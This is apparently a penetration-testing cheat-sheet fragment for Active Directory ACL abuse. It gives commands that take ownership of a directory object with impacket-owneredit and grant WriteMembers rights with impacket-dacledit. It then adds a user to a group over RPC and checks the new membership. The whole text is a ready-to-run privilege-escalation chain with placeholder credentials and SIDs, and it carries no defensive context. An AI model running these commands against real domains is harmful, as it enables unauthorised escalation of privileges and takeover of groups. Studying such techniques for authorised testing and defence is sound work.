
```bash
impacket-owneredit -action write -new-owner $USER \
-target-sid 'S-1-5-21-XX...' $DOMAIN/$USER:$PASS
```


# DACL edit

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers'\
-principal $user -target-sid 'S-1-5-21-XX...' $domain/$user:$pass
```

# Add USER to  group
    
```bash
net rpc group addmem "Group_name" $user -U $domain/$user%$pass -S $ip
```

**_Note: There will be no output from this command, we need to instead verify it worked in the next command._**

```bash
net rpc group members "Group_name" -U $domain/$user%$pass -S $ip
```

